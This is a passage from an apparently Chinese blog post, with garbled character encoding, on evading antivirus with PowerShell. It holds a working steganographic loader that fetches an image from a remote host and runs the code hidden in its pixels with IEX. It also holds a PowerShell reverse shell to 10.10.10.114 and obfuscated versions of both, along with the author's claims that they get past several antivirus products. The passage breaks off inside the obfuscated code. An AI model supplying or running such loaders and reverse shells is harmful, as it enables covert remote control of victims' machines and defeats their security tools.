<li><p>åœ¨Windows 7ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿä¸­æ˜¯é»˜è®¤å®‰è£…çš„ã€‚</p>
</li>
<li><p> PowerShellè„šæœ¬å¯ä»¥è¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œä¸éœ€è¦å†™å…¥ç£ç›˜ã€‚</p>
</li>
<li><p>å‡ ä¹ä¸ä¼šè§¦å‘æ€æ¯’è½¯ä»¶ã€‚</p>
</li>
<li><p>å¯ä»¥è¿œç¨‹æ‰§è¡Œã€‚</p>
</li>
<li><p>ç›®å‰å¾ˆå¤šå·¥å…·éƒ½æ˜¯åŸºäºPowerShellå¼€å‘çš„ã€‚</p>
</li>
<li><p>ä½¿å¾—Windowsçš„è„šæœ¬æ”»å‡»å˜å¾—æ›´åŠ å®¹æ˜“ã€‚</p>
</li>
<li><p>cmd.exeé€šå¸¸ä¼šè¢«é˜»æ­¢è¿è¡Œï¼Œä½†æ˜¯PowerShellä¸ä¼šã€‚</p>
</li>
<li><p>å¯ä»¥ç”¨æ¥ç®¡ç†æ´»åŠ¨ç›®å½•ã€‚</p>
</li>
</ul>
<h3 id="powershellçš„æ‰§è¡Œç­–ç•¥é—®é¢˜"><a href="#powershellçš„æ‰§è¡Œç­–ç•¥é—®é¢˜" class="headerlink" title="powershellçš„æ‰§è¡Œç­–ç•¥é—®é¢˜"></a>powershellçš„æ‰§è¡Œç­–ç•¥é—®é¢˜</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Unrestricted æƒé™æœ€é«˜ï¼Œå¯ä»¥ä¸å—é™åˆ¶æ‰§è¡Œä»»æ„è„šæœ¬</span><br><span class="line">  Restricted é»˜è®¤ç­–ç•¥ï¼Œä¸å…è®¸ä»»æ„è„šæœ¬çš„æ‰§è¡Œ</span><br><span class="line">  AllSigned æ‰€æœ‰è„šæœ¬å¿…é¡»ç»è¿‡ç­¾åè¿è¡Œ</span><br><span class="line">  RemoteSigned æœ¬åœ°è„šæœ¬æ— é™åˆ¶ï¼Œä½†æ˜¯å¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»ç»è¿‡ç­¾å</span><br><span class="line">  Bypass æ²¡æœ‰ä»»ä½•é™åˆ¶å’Œæç¤º</span><br><span class="line">  Undefined æ²¡æœ‰è®¾ç½®è„šæœ¬çš„ç­–ç•¥</span><br><span class="line">æŸ¥çœ‹powershellçš„é»˜è®¤ç­–ç•¥ï¼šGet-ExecutionPolicy </span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨å®æˆ˜ä¸­ å»ä¿®æ”¹powershellçš„æ‰§è¡Œç­–ç•¥å¹¶ä¸å¤ªå®ç”¨ï¼ŒåŠ¨ä½œå¤ªå¤§å®¹æ˜“è¢«æ€è½¯å‘ç° ç°åœ¨360(win7æµ‹è¯•ä¸‹)ä¹Ÿå¼€å§‹ç¦æ­¢è°ƒç”¨powershelläº†â€¦(win7æµ‹è¯•ä¸‹360ä¼šæ‹¦æˆªpowershel ä½†æ˜¯åœ¨win10ä¸‹å°±æ²¡â€¦..)</p>
<h3 id="Invoke-PSimageå›¾ç‰‡æ··æ·†powershellä»£ç "><a href="#Invoke-PSimageå›¾ç‰‡æ··æ·†powershellä»£ç " class="headerlink" title="Invoke-PSimageå›¾ç‰‡æ··æ·†powershellä»£ç "></a>Invoke-PSimageå›¾ç‰‡æ··æ·†powershellä»£ç </h3><p>å‚è€ƒ <a href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
<p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p>
<blockquote>
<p>ä»¥ PNG æ–‡ä»¶çš„åƒç´ å¯¹ PowerShell è„šæœ¬è¿›è¡Œç¼–ç ï¼Œå¹¶ç”Ÿæˆè¦æ‰§è¡Œçš„å•è¡Œçº¿<br>Invoke-PSImage é‡‡ç”¨ PowerShell è„šæœ¬ï¼Œå¹¶å°†è„šæœ¬çš„å­—èŠ‚ç¼–ç ä¸º PNG å›¾åƒçš„åƒç´ ã€‚å®ƒç”Ÿæˆä¸€ä¸ªå•è¡Œçº¿ï¼Œç”¨äºä» Web çš„æ–‡ä»¶æ‰§è¡Œã€‚<br>å®ƒå¯ä»¥ä»…ä½¿ç”¨æœ‰æ•ˆè´Ÿè½½æ•°æ®åˆ›å»ºæ–°å›¾åƒï¼Œä¹Ÿå¯ä»¥å°†æœ‰æ•ˆè´Ÿè½½åµŒå…¥åˆ°ç°æœ‰å›¾åƒçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ä¸­ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒå®é™…å›¾ç‰‡ã€‚å›¾åƒä¿å­˜ä¸º PNGï¼Œå¹¶ä¸”å¯ä»¥æ— æŸå‹ç¼©ï¼Œè€Œä¸ä¼šå½±å“æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½çš„èƒ½åŠ›ï¼Œå› ä¸ºæ•°æ®å­˜å‚¨åœ¨é¢œè‰²æœ¬èº«ä¸­ã€‚åˆ›å»ºæ–°æ˜ åƒæ—¶ï¼Œæ™®é€šçš„ PowerShell è„šæœ¬å®é™…ä¸Šä¼šæ˜¾è‘—å‹ç¼©ï¼Œé€šå¸¸ä¼šç”Ÿæˆæ–‡ä»¶å¤§å°çº¦ä¸ºåŸå§‹è„šæœ¬çš„ 50% çš„ pngã€‚<br>ä½¿ç”¨åµŒå…¥æ–¹æ³•æ—¶ï¼Œæ¯ä¸ªåƒç´ ä¸­ 2 ä¸ªé¢œè‰²å€¼ä¸­æœ€ä½æœ‰æ•ˆ 4 ä½ç”¨äºä¿å­˜æœ‰æ•ˆè´Ÿè½½ã€‚å›¾åƒè´¨é‡å°†å› æ­¤å—åˆ°å½±å“ï¼Œä½†å®ƒçœ‹èµ·æ¥ä»ç„¶ä¸é”™ã€‚å®ƒå¯ä»¥æ¥å—å¤§å¤šæ•°å›¾åƒç±»å‹ä½œä¸ºè¾“å…¥ï¼Œä½†è¾“å‡ºå°†å§‹ç»ˆä¸ºPNGï¼Œå› ä¸ºå®ƒéœ€è¦æ˜¯æ— æŸçš„ã€‚å›¾åƒçš„æ¯ä¸ªåƒç´ ç”¨äºå®¹çº³ä¸€ä¸ªå­—èŠ‚çš„è„šæœ¬ï¼Œå› æ­¤æ‚¨éœ€è¦ä¸€ä¸ªåƒç´ è‡³å°‘ä¸è„šæœ¬ä¸­çš„å­—èŠ‚æ•°ä¸€æ ·å¤šçš„å›¾åƒã€‚è¿™ç›¸å½“å®¹æ˜“ - ä¾‹å¦‚ï¼ŒInvoke-Mimikatzé€‚åˆ1920x1200çš„å›¾åƒã€‚</p>
</blockquote>
<p>å…ˆæ‰¾ä¸€å¼ é«˜åƒç´ çš„123.jpgå›¾ç‰‡ æ–¹ä¾¿åç»­å†™å…¥shellcode</p>
<p><img src="/posts/adb63639/1.png" alt="æˆªå›¾"></p>
<br>

<p>åœ¨CSä¸­ç”Ÿæˆä¸€ä¸ªpowershellçš„payload </p>
<p>åœ¨cmdä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\123.jpg -Out 456.jpg -Web</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/2.png" alt="æˆªå›¾"></p>
<p>åœ¨import-moduleæ—¶ è¦å…³é—­æ€è½¯ ä¸ç„¶ä¼šå‡ºç°æ‹’ç»</p>
<p><img src="/posts/adb63639/3.png" alt="æˆªå›¾"></p>
<p>ç„¶åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ 456.jpg</p>
<p><img src="/posts/adb63639/4.png" alt="æˆªå›¾"></p>
<p>ç„¶åå†powershellä¸­ä¼šç”Ÿæˆä¸€æ®µps1ä»£ç  å¤åˆ¶æŠ¥å­˜åˆ°shell.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"><span class="built_in">PS</span> C:\Users\guoyo\Desktop\powershell_bypasså­¦ä¹ \<span class="built_in">Invoke-PSImage</span><span class="literal">-master</span>&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>æ‰“å¼€CS ä½¿ç”¨æ–‡ä»¶ä¸‹è½½æ¨¡å—å»ä¸‹è½½ç”Ÿæˆçš„456.jpg ç‚¹å‡»â€Launchâ€ä¼šç”Ÿæˆä¸€ä¸ªurl</p>
<p><img src="/posts/adb63639/5.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/6.png" alt="æˆªå›¾"></p>
<p><code>http://10.10.10.114:80/456.jpg</code></p>
<p>ç„¶åå°†<code>shell.ps1</code>urlä¿®æ”¹ä¸ºCSç”Ÿæˆçš„é“¾æ¥</p>
<p><img src="/posts/adb63639/7.png" alt="æˆªå›¾"></p>
<p>æ”¹ä¸ºps1æ–‡ä»¶ shell.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://10.10.10.114:80/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°ç«ç»’æœºå™¨ä¸Šè¿è¡Œä¾¿å¯æˆåŠŸä¸Šçº¿â€¦ä½†æ˜¯é™æ€æŸ¥æ€shell.ps1ä¼šè¢«æ€æ‰ï¼Œæ‰€ä»¥å¯ä»¥å…ˆè¿›è¡Œpowershellæ··æ·†</p>
<p><img src="/posts/adb63639/8.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/9.png" alt="æˆªå›¾"></p>
<p>è…¾è®¯ç”µè„‘ç®¡å®¶æŸ¥ä¸å‡ºï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸Šçº¿</p>
<h3 id="Invoke-Obfuscationæ··æ·†"><a href="#Invoke-Obfuscationæ··æ·†" class="headerlink" title="Invoke Obfuscationæ··æ·†"></a>Invoke Obfuscationæ··æ·†</h3><p>powershellçš„å…æ€â½…æ³•æœ‰å¾ˆå¤šï¼Œå¯¹ä»£ç è¿›â¾ç¼–ç æ˜¯æœ€å¸¸â»…çš„â¼€ç§ï¼Œè¿™â¾¥ä»‹ç»â¼€ä¸ªä¸“â»”â½¤æ¥å¯¹powershell<br>è¿›â¾ç¼–ç å…æ€çš„æ¡†æ¶Invoke Obfuscationï¼Œè¿™ä¹Ÿæ˜¯è‘—åçš„APT32ç»„ç»‡æµ·è²èŠ±å¸¸â½¤çš„â¼€ä¸ªâ¼¯å…·ã€‚<br>è¯¥å·¥å…·å¯ä»¥å¯¹powershellä»£ç è¿›è¡Œ ASCII/hex/octal/binaryç”šè‡³SecureStringè¿›è¡ŒåŠ å¯†æ··æ·†</p>
<p>ä½¿ç”¨Invoke Obfuscationå¯¹powerhsellè¿›è¡Œæ··æ·† å°†shell.ps1æ”¾åˆ°è¯¥ç›®å½•ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Moudle .\Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>

<p>shell2.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="number">3</span>`7j&#125;=  [<span class="type">typE</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span><span class="string">&#x27;mat&#x27;</span>,<span class="string">&#x27;H&#x27;</span>)  ; <span class="variable">$</span>&#123;K8`ZR2J&#125; = [<span class="type">tYPE</span>](<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;6&#125;&#123;4&#125;&#123;3&#125;&#123;5&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;Syste&#x27;</span>,<span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;m.&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;t.e&#x27;</span>,<span class="string">&#x27;coDI&#x27;</span>,<span class="string">&#x27;TEX&#x27;</span>); &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;al&#x27;</span>,<span class="string">&#x27;s&#x27;</span>) (<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;New-O&#x27;</span>,<span class="string">&#x27;bj&#x27;</span>,<span class="string">&#x27;ect&#x27;</span>);.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;pe&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;dd-Ty&#x27;</span>) <span class="literal">-A</span> (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Drawing&#x27;</span>,<span class="string">&#x27;em.&#x27;</span>,<span class="string">&#x27;yst&#x27;</span>);<span class="variable">$</span>&#123;g&#125;=&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aw&#x27;</span>,<span class="string">&#x27;Syst&#x27;</span>,<span class="string">&#x27;ing.Bitma&#x27;</span>,<span class="string">&#x27;em.Dr&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)((&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;nt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;WebCli&#x27;</span>,<span class="string">&#x27;Net.&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;penRea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;O&#x27;</span>).Invoke((<span class="string">&quot;&#123;1&#125;&#123;7&#125;&#123;5&#125;&#123;3&#125;&#123;8&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;6&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;http://1&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;4:80&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;.10.10.11&#x27;</span>,<span class="string">&#x27;pg&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;/4&#x27;</span>)));<span class="variable">$</span>&#123;O&#125;=.(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;By&#x27;</span>,<span class="string">&#x27;te[]&#x27;</span>) <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|.(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="keyword">foreach</span>(<span class="variable">$</span>&#123;x&#125; <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$</span>&#123;p&#125;=<span class="variable">$</span>&#123;g&#125;.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;Ge&#x27;</span>,<span class="string">&#x27;Pixel&#x27;</span>,<span class="string">&#x27;t&#x27;</span>).Invoke(<span class="variable">$</span>&#123;x&#125;,<span class="variable">$</span>&#123;_&#125;);<span class="variable">$</span>&#123;o&#125;[<span class="variable">$</span>&#123;<span class="type">_</span>&#125;*<span class="number">2560</span>+<span class="variable">$</span>&#123;<span class="type">x</span>&#125;]=( (ChIlDiTeM  (<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;VaRia&#x27;</span>,<span class="string">&#x27;e:37J&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;L&#x27;</span>) ).<span class="string">&quot;vaL`Ue&quot;</span>::(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Fl&#x27;</span>,<span class="string">&#x27;oor&#x27;</span>).Invoke((<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;B&quot;</span><span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;g&quot;</span> <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;EX&#x27;</span>)(  ( <span class="built_in">gci</span>  (<span class="string">&#x27;V&#x27;</span>+<span class="string">&#x27;ar&#x27;</span>+<span class="string">&#x27;Iab&#x27;</span>+<span class="string">&#x27;LE:k8ZR&#x27;</span>+<span class="string">&#x27;2J&#x27;</span>) ).<span class="string">&quot;VA`LUe&quot;</span>::<span class="string">&quot;ASC`iI&quot;</span>.<span class="string">&quot;GEt`s`TRi`Ng&quot;</span>(<span class="variable">$</span>&#123;o&#125;[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> é™æ€æŸ¥æ€æ•ˆæœ</p>
<p>æ··æ·†å‰</p>
<p><img src="/posts/adb63639/10.png" alt="æˆªå›¾"></p>
<p>æ··æ·†å</p>
<p><img src="/posts/adb63639/11.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/12.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/13.png" alt="æˆªå›¾"></p>
<p>ä¹Ÿå¯ä»¥è¿‡360çš„é™æ€æŸ¥æ€(ä½†æ˜¯ç°åœ¨360ç¦æ­¢è°ƒç”¨powershell æ‰€ä»¥â€¦)</p>
<p>ä¸Šä¼ åˆ°VTä¸ŠæŸ¥çœ‹æ··æ·†åçš„æ•ˆæœ</p>
<p><a href="https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1">https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1</a></p>
<p><img src="/posts/adb63639/14.png" alt="æˆªå›¾"></p>
<p>åŠ¨æ€æŸ¥æ€æ•ˆæœ</p>
<p><img src="/posts/adb63639/15.png" alt="æˆªå›¾"></p>
<p>ç«ç»’ è…¾è®¯ç®¡å®¶éƒ½å¯ä»¥æ­£å¸¸ä¸Šçº¿ ä¸è¿‡360ç¦æ­¢è°ƒç”¨powershell æ²¡å‘æˆåŠŸåˆ©ç”¨â€¦ </p>
<h3 id="Powershell-socketå…æ€"><a href="#Powershell-socketå…æ€" class="headerlink" title="Powershell socketå…æ€"></a>Powershell socketå…æ€</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> stream <span class="literal">-Value</span>(<span class="variable">$client</span>.GetStream());</span><br><span class="line"></span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span> | % &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">Set-Variable</span> <span class="literal">-Name</span> i <span class="literal">-Value</span>(<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length))) <span class="operator">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> <span class="keyword">data</span> <span class="literal">-Value</span> ((<span class="built_in">New-Object</span> <span class="literal">-TypeNameSystem</span>.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$i</span>));</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback <span class="literal">-Value</span> (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback2 <span class="literal">-Value</span> (<span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendbyte <span class="literal">-Value</span> (([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>));</span><br><span class="line">  <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>, <span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">  <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨Invoke Obfuscation æ··æ·†å</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line">&amp;(<span class="string">&#x27;sV&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;w4c&#x27;</span>) ( [<span class="type">tYPE</span>](<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;TE&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;En&#x27;</span>,<span class="string">&#x27;cOd&#x27;</span>),<span class="string">&#x27;Xt.&#x27;</span>) ) ;&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Set&#x27;</span>,<span class="string">&#x27;-&#x27;</span>),<span class="string">&#x27;b&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aria&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),<span class="string">&#x27;le&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;C`L`IEnT&#125;.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;am&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;etS&#x27;</span>),<span class="string">&#x27;tre&#x27;</span>).<span class="string">&quot;i`N`VoKe&quot;</span>()) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;s&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;tr&#x27;</span>,<span class="string">&#x27;ea&#x27;</span>),<span class="string">&#x27;m&#x27;</span>);[<span class="built_in">byte</span>[]]<span class="variable">$</span>&#123;b`Yt`es&#125; =<span class="number">0</span>..<span class="number">65535</span>|&amp;(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;S&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;able&#x27;</span>),<span class="string">&#x27;et&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;Var&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&#x27;i&#x27;</span>) <span class="literal">-Value</span>(<span class="variable">$</span>&#123;s`T`Ream&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;Rea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>).<span class="string">&quot;IN`Voke&quot;</span>(<span class="variable">$</span>&#123;b`Y`TES&#125;, <span class="number">0</span>,<span class="variable">$</span>&#123;By`Tes&#125;.<span class="string">&quot;LeNg`TH&quot;</span>))) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;&amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Va&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ria&#x27;</span>,<span class="string">&#x27;ble&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t-&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ta&#x27;</span>,<span class="string">&#x27;da&#x27;</span>) <span class="literal">-Value</span> ((&amp;(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ect&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;w-&#x27;</span>,<span class="string">&#x27;Obj&#x27;</span>),<span class="string">&#x27;Ne&#x27;</span>) <span class="literal">-TypeName</span> (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;5&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;IEn&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;xt&#x27;</span>,<span 